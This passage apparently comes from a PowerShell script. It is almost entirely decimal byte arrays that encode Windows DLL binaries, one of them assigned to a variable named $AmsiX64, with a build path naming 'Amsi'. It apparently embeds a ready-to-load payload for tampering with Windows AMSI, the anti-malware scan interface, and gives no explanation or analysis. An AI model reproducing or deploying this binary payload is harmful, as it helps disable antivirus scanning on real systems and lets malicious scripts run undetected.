252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\" $AmsiX64 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 